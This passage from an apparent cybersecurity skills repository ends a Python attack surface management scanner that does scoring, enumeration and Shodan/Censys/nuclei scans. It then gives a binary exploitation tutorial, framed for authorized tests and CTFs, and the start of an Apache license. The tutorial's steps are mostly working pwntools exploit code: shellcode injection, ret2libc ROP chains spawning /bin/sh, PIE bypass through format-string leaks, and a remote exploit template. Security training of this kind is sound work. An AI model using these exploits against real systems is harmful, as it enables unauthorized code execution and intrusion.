    Final score is normalized to 0-100 range.
    """

    def __init__(self):
        self.weights = {
            "open_ports": 0.25,
            "vulnerabilities": 0.30,
            "technology_risk": 0.15,
            "exposure_level": 0.15,
            "data_sensitivity": 0.15,
        }

    def score_open_ports(self, ports):
        """Score based on open ports and their associated risk.

        Uses PORT_RISK_WEIGHTS to assign higher scores to management ports,
        databases, and legacy protocols.
        """
        if not ports:
            return 0.0

        total_risk = 0.0
        for port in ports:
            weight = PORT_RISK_WEIGHTS.get(port, 4.0)
            total_risk += weight

        # Normalize: more ports = higher risk, but with diminishing returns
        # Using log scale to prevent linear explosion with many ports
        normalized = min(100.0, (total_risk / len(ports)) * 10 * math.log2(len(ports) + 1))
        return round(normalized, 2)

    def score_vulnerabilities(self, vulns):
        """Score based on discovered vulnerabilities weighted by CVSS.

        Critical (9.0-10.0): weight 10
        High (7.0-8.9): weight 7
        Medium (4.0-6.9): weight 4
        Low (0.1-3.9): weight 2
        """
        if not vulns:
            return 0.0

        total_weight = 0.0
        for vuln in vulns:
            cvss = vuln.get("cvss_score", 0)
            if isinstance(cvss, str):
                try:
                    cvss = float(cvss)
                except ValueError:
                    cvss = 5.0

            if cvss >= 9.0:
                total_weight += 10.0
            elif cvss >= 7.0:
                total_weight += 7.0
            elif cvss >= 4.0:
                total_weight += 4.0
            else:
                total_weight += 2.0

        # Normalize with diminishing returns
        normalized = min(100.0, total_weight * math.log2(len(vulns) + 1))
        return round(normalized, 2)

    def score_technology_risk(self, technologies):
        """Score based on technology stack risk assessment."""
        if not technologies:
            return 0.0

        total_risk = 0.0
        matched = 0
        for tech in technologies:
            tech_lower = tech.lower()
            for known_tech, risk in HIGH_RISK_TECHNOLOGIES.items():
                if known_tech in tech_lower:
                    total_risk += risk
                    matched += 1
                    break

        if matched == 0:
            return 10.0  # Unknown tech gets baseline risk

        normalized = min(100.0, (total_risk / matched) * 12 * math.log2(matched + 1))
        return round(normalized, 2)

    def score_exposure_level(self, asset):
        """Score based on how exposed the asset is.

        Factors: internet-reachable, authentication required, CDN protection.
        """
        score = 50.0  # Base score for internet-facing asset

        # No HTTPS = higher risk
        if asset.get("scheme") == "http":
            score += 15.0

        # CDN protection reduces exposure
        if asset.get("cdn"):
            score -= 20.0

        # Authentication indicators reduce exposure
        status_code = asset.get("status_code", 200)
        if status_code in (401, 403):
            score -= 25.0

        # Default/login pages increase risk
        title = (asset.get("title") or "").lower()
        if any(kw in title for kw in ["login", "admin", "dashboard", "panel", "console"]):
            score += 20.0

        return round(max(0.0, min(100.0, score)), 2)

    def score_data_sensitivity(self, services, ports):
        """Score based on potential data sensitivity.

        Database ports, email services, and file shares indicate sensitive data handling.
        """
        score = 0.0
        service_set = set()
        for svc in (services or []):
            service_set.add(svc.lower() if isinstance(svc, str) else "")

        # Check for sensitive service indicators
        for indicator in SENSITIVE_SERVICE_INDICATORS:
            if indicator in service_set:
                score += 15.0

        # Check for database ports
        db_ports = {3306, 5432, 1433, 1521, 27017, 6379, 9200}
        exposed_db_ports = set(ports or []) & db_ports
        score += len(exposed_db_ports) * 20.0

        # File sharing ports
        file_ports = {21, 445, 139, 2049}
        exposed_file_ports = set(ports or []) & file_ports
        score += len(exposed_file_ports) * 15.0

        return round(min(100.0, score), 2)

    def calculate_asset_score(self, asset):
        """Calculate the overall exposure score for an asset.

        Returns a dict with component scores and weighted total (0-100).
        """
        ports = asset.get("ports", [])
        vulns = asset.get("vulnerabilities", [])
        technologies = asset.get("technologies", [])
        services = asset.get("services", [])

        component_scores = {
            "open_ports": self.score_open_ports(ports),
            "vulnerabilities": self.score_vulnerabilities(vulns),
            "technology_risk": self.score_technology_risk(technologies),
            "exposure_level": self.score_exposure_level(asset),
            "data_sensitivity": self.score_data_sensitivity(services, ports),
        }

        weighted_total = sum(
            component_scores[key] * self.weights[key]
            for key in self.weights
        )

        return {
            "host": asset.get("host", asset.get("ip", "unknown")),
            "total_score": round(weighted_total, 2),
            "risk_level": self._risk_level(weighted_total),
            "component_scores": component_scores,
            "weights": self.weights,
        }

    def _risk_level(self, score):
        if score >= 80:
            return "CRITICAL"
        elif score >= 60:
            return "HIGH"
        elif score >= 40:
            return "MEDIUM"
        elif score >= 20:
            return "LOW"
        return "INFORMATIONAL"

    def score_all_assets(self, assets):
        """Score all assets and return sorted by risk."""
        scored = [self.calculate_asset_score(a) for a in assets]
        scored.sort(key=lambda x: x["total_score"], reverse=True)
        return scored


class ASMPipeline:
    """Orchestrates the full attack surface management pipeline."""

    def __init__(self, domain, shodan_key=None, censys_id=None, censys_secret=None):
        self.domain = domain
        self.shodan_key = shodan_key
        self.censys_id = censys_id
        self.censys_secret = censys_secret
        self.subdomains = []
        self.live_hosts = []
        self.shodan_results = []
        self.censys_results = []
        self.nuclei_findings = []
        self.assets = []

    def enumerate_subdomains(self):
        """Phase 1: Discover subdomains."""
        enumerator = SubdomainEnumerator(self.domain)
        self.subdomains = enumerator.enumerate_all()

        # Enrich with Censys certificate transparency
        if self.censys_id and self.censys_secret:
            try:
                censys = CensysScanner(self.censys_id, self.censys_secret)
                ct_subdomains = censys.search_certificates(self.domain)
                combined = set(self.subdomains) | ct_subdomains
                self.subdomains = sorted(combined)
                print(f"[+] After CT enrichment: {len(self.subdomains)} subdomains")
            except Exception as e:
                print(f"[-] Censys CT search failed: {e}")

        return self.subdomains

    def fingerprint_services(self):
        """Phase 2: Probe live hosts and fingerprint technologies."""
        fingerprinter = ServiceFingerprinter(self.subdomains)
        self.live_hosts = fingerprinter.run_httpx()
        return self.live_hosts

    def discover_shodan(self):
        """Phase 3: Enrich with Shodan data."""
        if not self.shodan_key:
            print("[!] Shodan API key not provided, skipping")
            return []

        try:
            scanner = ShodanScanner(self.shodan_key)
            scanner.search_domain(self.domain)
            scanner.search_ssl_cert(self.domain)
            self.shodan_results = scanner.get_all_results()
        except Exception as e:
            print(f"[-] Shodan scanning failed: {e}")
        return self.shodan_results

    def discover_censys(self):
        """Phase 4: Enrich with Censys data."""
        if not self.censys_id or not self.censys_secret:
            print("[!] Censys API credentials not provided, skipping")
            return []

        try:
            scanner = CensysScanner(self.censys_id, self.censys_secret)
            self.censys_results = scanner.search_hosts(self.domain)
        except Exception as e:
            print(f"[-] Censys scanning failed: {e}")
        return self.censys_results

    def scan_vulnerabilities(self):
        """Phase 5: Run vulnerability scans."""
        targets = []
        for host in self.live_hosts:
            url = host.get("url", "")
            if url:
                targets.append(url)
        if not targets:
            targets = [f"https://{sub}" for sub in self.subdomains[:100]]

        scanner = VulnerabilityScanner(targets)
        self.nuclei_findings = scanner.run_nuclei()
        return self.nuclei_findings

    def _build_asset_inventory(self):
        """Merge all data sources into a unified asset inventory."""
        asset_map = defaultdict(lambda: {
            "host": "",
            "ip": "",
            "ports": [],
            "services": [],
            "technologies": [],
            "vulnerabilities": [],
            "status_code": 200,
            "title": "",
            "cdn": False,
            "scheme": "https",
        })

        # Merge httpx results
        for host in self.live_hosts:
            key = host.get("host", host.get("input", ""))
            asset = asset_map[key]
            asset["host"] = key
            asset["status_code"] = host.get("status_code", 200)
            asset["title"] = host.get("title", "")
            asset["cdn"] = host.get("cdn", False)
            asset["scheme"] = host.get("scheme", "https")
            techs = host.get("tech", [])
            if isinstance(techs, list):
                asset["technologies"].extend(techs)
            port = host.get("port", 0)
            if port:
                asset["ports"].append(port)

        # Merge Shodan results
        for result in self.shodan_results:
            ip = result.get("ip_str", "")
            hostnames = result.get("hostnames", [])
            key = hostnames[0] if hostnames else ip
            asset = asset_map[key]
            asset["ip"] = ip
            asset["host"] = asset["host"] or key
            port = result.get("port", 0)
            if port and port not in asset["ports"]:
                asset["ports"].append(port)
            product = result.get("product", "")
            if product and product not in asset["services"]:
                asset["services"].append(product)
            for cve in result.get("vulns", []):
                asset["vulnerabilities"].append({
                    "cve_id": cve,
                    "cvss_score": result.get("vulns", {}).get(cve, {}).get(
                        "cvss", 5.0
                    ) if isinstance(result.get("vulns"), dict) else 5.0,
                    "source": "shodan",
                })

        # Merge Censys results
        for result in self.censys_results:
            ip = result.get("ip", "")
            key = ip
            asset = asset_map[key]
            asset["ip"] = ip
            asset["host"] = asset["host"] or ip
            for svc in result.get("services", []):
                port = svc.get("port", 0)
                if port and port not in asset["ports"]:
                    asset["ports"].append(port)
                svc_name = svc.get("service_name", "")
                if svc_name and svc_name not in asset["services"]:
                    asset["services"].append(svc_name)

        # Merge Nuclei findings
        for finding in self.nuclei_findings:
            host = finding.get("host", "")
            # Match to existing asset or create new entry
            matched_key = None
            for key in asset_map:
                if key in host or host in key:
                    matched_key = key
                    break
            if matched_key is None:
                matched_key = host
            asset_map[matched_key]["vulnerabilities"].append({
                "cve_id": finding.get("cve_id", ""),
                "name": finding.get("name", ""),
                "severity": finding.get("severity", ""),
                "cvss_score": finding.get("cvss_score", 5.0),
                "template_id": finding.get("template_id", ""),
                "source": "nuclei",
            })

        # Deduplicate technologies and ports
        for asset in asset_map.values():
            asset["ports"] = sorted(set(asset["ports"]))
            asset["technologies"] = list(set(asset["technologies"]))
            asset["services"] = list(set(asset["services"]))

        self.assets = list(asset_map.values())
        return self.assets

    def score_assets(self):
        """Phase 6: Calculate exposure scores for all assets."""
        if not self.assets:
            self._build_asset_inventory()

        scorer = ExposureScorer()
        return scorer.score_all_assets(self.assets)

    def run_full_scan(self):
        """Execute the complete ASM pipeline."""
        print(f"\n{'='*60}")
        print(f"  ATTACK SURFACE MANAGEMENT SCAN: {self.domain}")
        print(f"{'='*60}\n")

        # Phase 1: Subdomain enumeration
        print("[*] Phase 1: Subdomain Enumeration")
        self.enumerate_subdomains()

        # Phase 2: Service fingerprinting
        print("\n[*] Phase 2: Service Fingerprinting")
        self.fingerprint_services()

        # Phase 3: Shodan enrichment
        print("\n[*] Phase 3: Shodan Asset Discovery")
        self.discover_shodan()

        # Phase 4: Censys enrichment
        print("\n[*] Phase 4: Censys Asset Discovery")
        self.discover_censys()

        # Phase 5: Vulnerability scanning
        print("\n[*] Phase 5: Vulnerability Scanning")
        self.scan_vulnerabilities()

        # Phase 6: Build inventory and score
        print("\n[*] Phase 6: Asset Inventory and Exposure Scoring")
        self._build_asset_inventory()
        scored_assets = self.score_assets()

        # Build final report
        report = {
            "scan_id": f"asm-{datetime.utcnow().strftime('%Y%m%d%H%M%S')}",
            "domain": self.domain,
            "generated_at": datetime.utcnow().isoformat(),
            "summary": {
                "total_subdomains": len(self.subdomains),
                "live_hosts": len(self.live_hosts),
                "shodan_services": len(self.shodan_results),
                "censys_hosts": len(self.censys_results),
                "total_vulnerabilities": len(self.nuclei_findings),
                "total_assets": len(self.assets),
                "critical_assets": sum(
                    1 for a in scored_assets if a["risk_level"] == "CRITICAL"
                ),
                "high_risk_assets": sum(
                    1 for a in scored_assets if a["risk_level"] == "HIGH"
                ),
                "medium_risk_assets": sum(
                    1 for a in scored_assets if a["risk_level"] == "MEDIUM"
                ),
                "low_risk_assets": sum(
                    1 for a in scored_assets if a["risk_level"] in ("LOW", "INFORMATIONAL")
                ),
                "average_score": round(
                    sum(a["total_score"] for a in scored_assets) / max(len(scored_assets), 1), 2
                ),
            },
            "scored_assets": scored_assets,
            "subdomains": self.subdomains,
            "vulnerabilities": self.nuclei_findings,
            "raw_data": {
                "httpx_hosts": len(self.live_hosts),
                "shodan_matches": len(self.shodan_results),
                "censys_matches": len(self.censys_results),
            },
        }

        return report


def main():
    parser = argparse.ArgumentParser(
        description="Attack Surface Management Agent"
    )
    parser.add_argument("--domain", help="Target domain")
    parser.add_argument("--domain-list", help="File with list of target domains")
    parser.add_argument(
        "--action",
        required=True,
        choices=["enumerate", "fingerprint", "shodan", "censys", "vuln_scan", "score", "full_scan"],
    )
    parser.add_argument("--shodan-key", help="Shodan API key")
    parser.add_argument("--censys-id", help="Censys API ID")
    parser.add_argument("--censys-secret", help="Censys API secret")
    parser.add_argument("--input", help="Input file from previous scan (JSON)")
    parser.add_argument("--output", default="asm_report.json")
    args = parser.parse_args()

    domains = []
    if args.domain:
        domains.append(args.domain)
    elif args.domain_list:
        with open(args.domain_list) as f:
            domains = [line.strip() for line in f if line.strip()]
    else:
        print("[-] Provide --domain or --domain-list")
        return

    all_reports = []
    for domain in domains:
        pipeline = ASMPipeline(
            domain=domain,
            shodan_key=args.shodan_key,
            censys_id=args.censys_id,
            censys_secret=args.censys_secret,
        )

        if args.action == "enumerate":
            subdomains = pipeline.enumerate_subdomains()
            report = {
                "domain": domain,
                "subdomains": subdomains,
                "count": len(subdomains),
            }
        elif args.action == "fingerprint":
            pipeline.enumerate_subdomains()
            hosts = pipeline.fingerprint_services()
            report = {"domain": domain, "live_hosts": hosts, "count": len(hosts)}
        elif args.action == "shodan":
            results = pipeline.discover_shodan()
            report = {"domain": domain, "shodan_results": results, "count": len(results)}
        elif args.action == "censys":
            results = pipeline.discover_censys()
            report = {"domain": domain, "censys_results": results, "count": len(results)}
        elif args.action == "vuln_scan":
            pipeline.enumerate_subdomains()
            pipeline.fingerprint_services()
            findings = pipeline.scan_vulnerabilities()
            report = {"domain": domain, "vulnerabilities": findings, "count": len(findings)}
        elif args.action == "score":
            if args.input:
                with open(args.input) as f:
                    prev_data = json.load(f)
                assets = prev_data.get("scored_assets", prev_data.get("assets", []))
                scorer = ExposureScorer()
                scored = scorer.score_all_assets(assets)
                report = {"domain": domain, "scored_assets": scored}
            else:
                report = pipeline.run_full_scan()
        elif args.action == "full_scan":
            report = pipeline.run_full_scan()
        else:
            print(f"[-] Unknown action: {args.action}")
            continue

        all_reports.append(report)

    output = all_reports[0] if len(all_reports) == 1 else {"domains": all_reports}
    with open(args.output, "w") as f:
        json.dump(output, f, indent=2, default=str)
    print(f"\n[+] Report saved to {args.output}")

    # Print summary
    for report in all_reports:
        if "summary" in report:
            s = report["summary"]
            print(f"\n{'='*60}")
            print(f"  ASM SUMMARY: {report.get('domain', 'N/A')}")
            print(f"{'='*60}")
            print(f"  Subdomains discovered: {s.get('total_subdomains', 0)}")
            print(f"  Live hosts: {s.get('live_hosts', 0)}")
            print(f"  Total vulnerabilities: {s.get('total_vulnerabilities', 0)}")
            print(f"  Assets scored: {s.get('total_assets', 0)}")
            print(f"  Average exposure score: {s.get('average_score', 0)}")
            print(f"  CRITICAL: {s.get('critical_assets', 0)}")
            print(f"  HIGH: {s.get('high_risk_assets', 0)}")
            print(f"  MEDIUM: {s.get('medium_risk_assets', 0)}")
            print(f"  LOW: {s.get('low_risk_assets', 0)}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/performing-binary-exploitation-analysis/SKILL.md =====
---
name: performing-binary-exploitation-analysis
description: 'Analyze ELF binaries for memory-corruption vulnerabilities and build proof-of-concept
  exploits using pwntools, checksec, and ROPgadget for buffer overflows and ROP chains. Use
  when a penetration test or CTF challenge requires evaluating compiler mitigations (NX, ASLR,
  stack canaries, PIE, RELRO) or developing a working exploit to demonstrate impact.

  '
domain: cybersecurity
subdomain: offensive-security
tags:
- binary-exploitation
- pwntools
- rop-chains
- buffer-overflow
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- ID.RA-01
- GV.OV-02
- DE.AE-07
mitre_attack:
- T1078
- T1190
- T1059
---

# Performing Binary Exploitation Analysis

**For authorized security testing and CTF challenges only.**

Analyze ELF binaries for exploitation vectors using checksec, ROPgadget,
and pwntools for buffer overflow and ROP chain development.

## When to Use

- Analyzing ELF binaries during authorized penetration tests to identify memory corruption vulnerabilities
- Solving binary exploitation challenges in CTF competitions
- Evaluating the effectiveness of compiler mitigations (NX, ASLR, stack canaries, PIE, RELRO) on target binaries
- Developing proof-of-concept exploits for vulnerability reports to demonstrate impact
- Training security engineers in exploit development techniques for defensive awareness
- Validating that security patches for buffer overflow vulnerabilities are effective

**Do not use** against systems without explicit written authorization. Binary exploitation techniques can cause system instability and must only be applied in controlled environments (lab VMs, CTF platforms, authorized pentests with scope documents).

## Prerequisites

- Linux system (Ubuntu/Debian recommended) for exploit development
- Python 3.8+ with `pwntools` (`pip install pwntools`)
- GDB with `pwndbg` or `GEF` plugin for enhanced debugging
- `ROPgadget` for ROP chain gadget discovery (`pip install ROPgadget`)
- `checksec` (included with pwntools or standalone via `apt install checksec`)
- Target vulnerable binary compiled for testing (e.g., from pwnable.kr, ROP Emporium, or custom test binaries)
- Basic understanding of x86/x86_64 calling conventions and stack layout

## Workflow

### Step 1: Install the Exploitation Toolkit

```bash
# Install pwntools and dependencies
pip install pwntools ROPgadget

# Install GDB with pwndbg plugin
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# Alternatively, install GEF (GDB Enhanced Features)
# bash -c "$(curl -fsSL https://gef.blah.cat/sh)"

# Install supporting tools
sudo apt install -y gdb nasm gcc-multilib libc6-dbg

# Verify installation
python3 -c "from pwn import *; print('pwntools version:', version)"
checksec --version
ROPgadget --version
```

### Step 2: Analyze Binary Protections with checksec

Before writing any exploit, enumerate the security mitigations compiled into the binary:

```python
from pwn import *

# Load the target binary
binary_path = "./vulnerable_server"
elf = ELF(binary_path)

# checksec output explains what mitigations are in place
print(f"Architecture: {elf.arch}")
print(f"Bits: {elf.bits}")
print(f"Endianness: {elf.endian}")
print()

# Key security properties
# RELRO: Full = GOT is read-only, Partial = GOT header read-only, No = writable GOT
# Stack Canary: Detects stack buffer overflows via random canary value
# NX (No-eXecute): Prevents executing code on the stack (DEP)
# PIE: Position Independent Executable, randomizes base address
# ASLR: OS-level address randomization (check /proc/sys/kernel/randomize_va_space)

# Also available via command line:
# checksec --file=./vulnerable_server
```

```bash
# Command-line checksec output example:
checksec --file=./vulnerable_server
# RELRO           STACK CANARY      NX            PIE
# Partial RELRO   No canary found   NX disabled   No PIE

# Check ASLR status on the system
cat /proc/sys/kernel/randomize_va_space
# 0 = disabled, 1 = conservative, 2 = full randomization
```

### Step 3: Find the Buffer Overflow Offset

Determine exactly how many bytes are needed to overwrite the return address:

```python
from pwn import *

context.binary = ELF("./vulnerable_server")
context.log_level = "info"

# Method 1: Use cyclic pattern to find exact offset
# Generate a unique cyclic pattern
pattern_length = 200
pattern = cyclic(pattern_length)
print(f"Generated cyclic pattern of length {pattern_length}")

# Send the pattern to the binary
p = process("./vulnerable_server")
p.sendline(pattern)
p.wait()

# After the crash, read the value in RIP/EIP from core dump or GDB
# Then find the offset:
# For 64-bit: crashed_value = p.corefile.fault_addr
# Or manually from GDB: "info registers rip" after crash
crashed_rip = 0x6161616c  # Example value from crash
offset = cyclic_find(crashed_rip)
print(f"Offset to return address: {offset} bytes")

# Method 2: Use GDB with pwndbg to find offset interactively
# In GDB:
#   pwndbg> cyclic 200
#   pwndbg> run < <(python3 -c "from pwn import *; print(cyclic(200).decode())")
#   pwndbg> cyclic -l $rsp   (or cyclic -l <value in RIP>)
```

### Step 4: Exploit a Stack Buffer Overflow (NX Disabled)

When NX is disabled, inject and execute shellcode directly on the stack:

```python
from pwn import *

# Configuration
binary_path = "./vulnerable_server"
context.binary = ELF(binary_path)
context.arch = "amd64"  # or "i386" for 32-bit

OFFSET = 72  # Determined in Step 3

# Generate shellcode
# execve("/bin/sh", NULL, NULL) - spawn a shell
shellcode = asm(shellcraft.sh())
print(f"Shellcode length: {len(shellcode)} bytes")

# Build the exploit payload
# Layout: [NOP sled] [shellcode] [padding] [return address -> NOP sled]
nop_sled = asm("nop") * 32

# For a local exploit without ASLR, we can estimate the buffer address
# Run in GDB first to find the buffer address:
#   break *main+XX  (after read/gets call)
#   x/20x $rsp
buffer_addr = 0x7fffffffe000  # Example - get from GDB

padding_len = OFFSET - len(nop_sled) - len(shellcode)
payload = nop_sled + shellcode + b"A" * padding_len + p64(buffer_addr)

# Launch exploit
p = process(binary_path)
p.sendline(payload)
p.interactive()  # Interact with the spawned shell
```

### Step 5: Build a ROP Chain (NX Enabled)

When NX prevents stack code execution, chain existing code gadgets (Return-Oriented Programming):

```bash
# Find ROP gadgets in the binary
ROPgadget --binary ./vulnerable_server

# Find specific gadgets
ROPgadget --binary ./vulnerable_server --only "pop|ret"
ROPgadget --binary ./vulnerable_server --only "mov|ret"

# Search for gadgets to control registers for syscall
ROPgadget --binary ./vulnerable_server | grep "pop rdi"
ROPgadget --binary ./vulnerable_server | grep "pop rsi"
ROPgadget --binary ./vulnerable_server | grep "pop rdx"
ROPgadget --binary ./vulnerable_server | grep "syscall"

# Find gadgets in libc (for ret2libc attacks)
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | head -20
```

```python
from pwn import *

binary_path = "./vulnerable_server"
elf = ELF(binary_path)
context.binary = elf

OFFSET = 72

# Method 1: ret2libc - call system("/bin/sh") via libc
# When the binary is dynamically linked and we know libc version
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# Start process to leak libc address
p = process(binary_path)

# If there is a format string or info leak, use it to find libc base
# Example: binary prints puts@GOT address
p.recvuntil(b"puts address: ")
puts_leak = int(p.recvline().strip(), 16)
libc.address = puts_leak - libc.symbols["puts"]
log.success(f"libc base: {hex(libc.address)}")

# Find a "pop rdi; ret" gadget for x86_64 calling convention
# First argument goes in RDI register
pop_rdi = elf.search(asm("pop rdi; ret")).__next__()
ret_gadget = elf.search(asm("ret")).__next__()  # Stack alignment

# Build the ROP chain: system("/bin/sh")
bin_sh_addr = next(libc.search(b"/bin/sh\x00"))
system_addr = libc.symbols["system"]

rop_chain = flat(
    b"A" * OFFSET,          # Padding to reach return address
    ret_gadget,              # Stack alignment (needed for movaps in system)
    pop_rdi,                 # pop rdi; ret - load /bin/sh address into RDI
    bin_sh_addr,             # Address of "/bin/sh" string in libc
    system_addr,             # Call system()
)

p.sendline(rop_chain)
p.interactive()
```

### Step 6: Use pwntools ROP Helper for Automated Chain Building

```python
from pwn import *

binary_path = "./vulnerable_server"
elf = ELF(binary_path)
context.binary = elf

OFFSET = 72

# pwntools automatic ROP chain builder
rop = ROP(elf)

# If the binary has enough gadgets, pwntools can build chains automatically
# For execve("/bin/sh", 0, 0) syscall:
rop.call("puts", [elf.got["puts"]])  # Leak GOT entry
rop.call(elf.symbols["main"])        # Return to main for second stage

# Print the ROP chain for debugging
print(rop.dump())

# Build first-stage payload (leak libc)
stage1 = flat(
    b"A" * OFFSET,
    rop.chain()
)

p = process(binary_path)
p.sendline(stage1)

# Parse the leaked puts address
p.recvuntil(b"\n")  # Skip program output
leaked_puts = u64(p.recvline().strip().ljust(8, b"\x00"))
log.success(f"Leaked puts@GOT: {hex(leaked_puts)}")

# Calculate libc base
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address = leaked_puts - libc.symbols["puts"]
log.success(f"libc base: {hex(libc.address)}")

# Build second-stage ROP chain using libc gadgets
rop2 = ROP(libc)
rop2.call("execve", [next(libc.search(b"/bin/sh\x00")), 0, 0])

stage2 = flat(
    b"A" * OFFSET,
    rop2.chain()
)

p.sendline(stage2)
p.interactive()
```

### Step 7: Debug Exploits with GDB and pwndbg

```python
from pwn import *

binary_path = "./vulnerable_server"
elf = ELF(binary_path)
context.binary = elf
context.terminal = ["tmux", "splitw", "-h"]  # or ["gnome-terminal", "--"]

# Launch binary under GDB with pwndbg
p = gdb.debug(binary_path, """
    # Set breakpoints at key locations
    break *main
    break *main+85

    # Continue to the vulnerable function
    continue
""")

# GDB commands useful during exploit development:
# pwndbg> vmmap              - Show memory mappings (find stack, heap, libc)
# pwndbg> checksec           - Show binary protections
# pwndbg> search -s "/bin/sh" - Find string in memory
# pwndbg> rop --grep "pop rdi" - Search for gadgets
# pwndbg> cyclic 200         - Generate cyclic pattern
# pwndbg> cyclic -l 0x616161 - Find offset from pattern value
# pwndbg> telescope $rsp 20  - Show stack contents
# pwndbg> x/20gx $rsp        - Examine stack as 64-bit values
# pwndbg> heap               - Analyze heap state
# pwndbg> got                 - Show GOT entries and resolved addresses
# pwndbg> plt                 - Show PLT entries

OFFSET = 72
payload = b"A" * OFFSET + p64(0xdeadbeef)
p.sendline(payload)
p.interactive()
```

### Step 8: Handle PIE and ASLR with Information Leaks

```python
from pwn import *

binary_path = "./vulnerable_pie_binary"
elf = ELF(binary_path)
context.binary = elf

# When PIE is enabled, we need to leak a code address to defeat randomization
# Common leak techniques:
# 1. Format string vulnerability: %p to leak stack/code pointers
# 2. Partial overwrite: overwrite only lower bytes of a pointer
# 3. Uninitialized memory: read stack memory containing code pointers

p = process(binary_path)

# Example: Using a format string leak to defeat PIE
# If the binary has a printf(user_input) vulnerability:
p.sendline(b"%p.%p.%p.%p.%p.%p.%p.%p.%p.%p")
leak_output = p.recvline().strip().decode()
leaked_addrs = leak_output.split(".")

# Parse leaked addresses to find a code pointer
for i, addr in enumerate(leaked_addrs):
    try:
        val = int(addr, 16)
        # PIE binaries typically load at 0x55XXXXXXXXXX on 64-bit
        if 0x550000000000 <= val <= 0x560000000000:
            log.info(f"Offset {i}: {addr} (likely PIE code address)")
        # libc addresses typically at 0x7fXXXXXXXXXX
        elif 0x7f0000000000 <= val <= 0x800000000000:
            log.info(f"Offset {i}: {addr} (likely libc address)")
    except ValueError:
        continue

# Once we have a leaked PIE address, calculate the binary base
leaked_code_addr = int(leaked_addrs[5], 16)  # Example offset
elf.address = leaked_code_addr - elf.symbols["main"]  # Adjust for known offset
log.success(f"PIE base: {hex(elf.address)}")

# Now we can use absolute addresses in our ROP chain
rop = ROP(elf)
# ... build chain using elf.symbols which are now correctly rebased
```

### Step 9: Exploit a Remote Target

```python
from pwn import *

# Configuration
REMOTE_HOST = "target.ctf.example.com"
REMOTE_PORT = 9001
binary_path = "./vulnerable_server"

elf = ELF(binary_path)
context.binary = elf

def exploit(target):
    """Run the full exploit chain against a target (local or remote)."""
    OFFSET = 72

    # Stage 1: Leak libc
    rop1 = ROP(elf)
    rop1.call("puts", [elf.got["puts"]])
    rop1.call(elf.symbols["main"])

    payload1 = flat(b"A" * OFFSET, rop1.chain())
    target.sendlineafter(b"Input: ", payload1)

    leaked = u64(target.recvline().strip().ljust(8, b"\x00"))
    log.success(f"Leaked puts: {hex(leaked)}")

    # Stage 2: ret2libc
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    libc.address = leaked - libc.symbols["puts"]

    rop2 = ROP(libc)
    rop2.call("execve", [next(libc.search(b"/bin/sh\x00")), 0, 0])

    payload2 = flat(b"A" * OFFSET, rop2.chain())
    target.sendlineafter(b"Input: ", payload2)

    target.interactive()

# Test locally first
log.info("Testing exploit locally...")
local = process(binary_path)
exploit(local)

# Then run against remote target
# log.info("Running exploit against remote target...")
# remote = remote(REMOTE_HOST, REMOTE_PORT)
# exploit(remote)
```

## Verification

- Confirm `checksec` correctly identifies all binary mitigations (NX, canary, PIE, RELRO) and results match manual inspection
- Verify the cyclic pattern offset finder produces the correct offset by setting a breakpoint at the `ret` instruction and confirming RIP/EIP contains the expected cyclic value
- Test shellcode payloads execute correctly in a controlled environment with NX disabled
- Validate ROP chains by single-stepping through gadgets in GDB to confirm register values are set correctly before the final syscall/function call
- Confirm the exploit works both locally (`process()`) and against a remote target (`remote()`) when the correct libc version is used
- Verify that PIE bypass correctly rebases all addresses by checking GDB `vmmap` output against calculated addresses
- Test that the exploit fails gracefully when mitigations are re-enabled (confirms the exploit targets the correct weakness)
- Run `ROPgadget` output through a deduplication filter to confirm all referenced gadgets exist at the specified offsets in the target binary

===== END FILE =====


===== FILE: skills/performing-binary-exploitation-analysis/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

